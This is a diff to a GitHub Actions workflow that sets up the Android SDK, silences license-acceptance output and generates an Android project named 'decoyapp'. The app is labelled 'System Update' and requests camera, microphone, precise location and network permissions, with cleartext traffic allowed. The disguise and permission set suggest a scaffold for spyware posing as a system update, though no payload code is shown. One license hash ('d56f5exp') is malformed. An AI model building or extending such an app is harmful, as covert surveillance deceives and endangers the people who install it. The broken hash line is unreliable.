@@ -21,13 +21,29 @@ jobs:
 
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
+        with:
+          cmdline-tools-version: "11.0"
+          packages: |
+            platform-tools
+            platforms;android-34
+            build-tools;34.0.0
 
-      - name: Accept SDK Licenses
+      - name: Accept SDK Licenses Quietly
         run: |
+          set +o pipefail
           SDK_ROOT="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-/usr/local/lib/android/sdk}}"
-          yes | "$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager" --sdk_root="$SDK_ROOT" --licenses > /dev/null || true
+          mkdir -p "$SDK_ROOT/licenses"
+          printf "8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5exp\n24333f8a63b6825ea9c5514f83c2829b004d1fee\n" > "$SDK_ROOT/licenses/android-sdk-license" || true
+          SDKMANAGER="$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager"
+          if [ ! -x "$SDKMANAGER" ]; then
+            SDKMANAGER=$(find "$SDK_ROOT" -name "sdkmanager" -type f -executable 2>/dev/null | head -n 1)
+          fi
+          if [ -n "$SDKMANAGER" ]; then
+            yes | "$SDKMANAGER" --sdk_root="$SDK_ROOT" --licenses >/dev/null 2>&1 || true
+          fi
+          echo "SDK licenses accepted."
 
-      - name: Create Minimal Android Project
+      - name: Create Android Project
         run: |
           mkdir -p app/src/main/java/com/example/decoyapp
           mkdir -p app/src/main/res/layout
@@ -89,8 +105,9 @@ jobs:
           EOF
 
           cat <<'EOF' > gradle.properties
-          org.gradle.jvmargs=-Xmx2048m
+          org.gradle.jvmargs=-Xmx2560m
           android.useAndroidX=true
+          android.enableJetifier=true
           android.nonTransitiveRClass=true
           EOF
 
@@ -99,6 +116,7 @@ jobs:
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
               <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
               <uses-permission android:name="android.permission.CAMERA" />
               <uses-permission android:name="android.permission.RECORD_AUDIO" />
               <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -107,6 +125,7 @@ jobs:
 
               <application
                   android:label="System Update"
+                  android:usesCleartextTraffic="true"
                   android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                   <activity
                       android:name=".MainActivity"
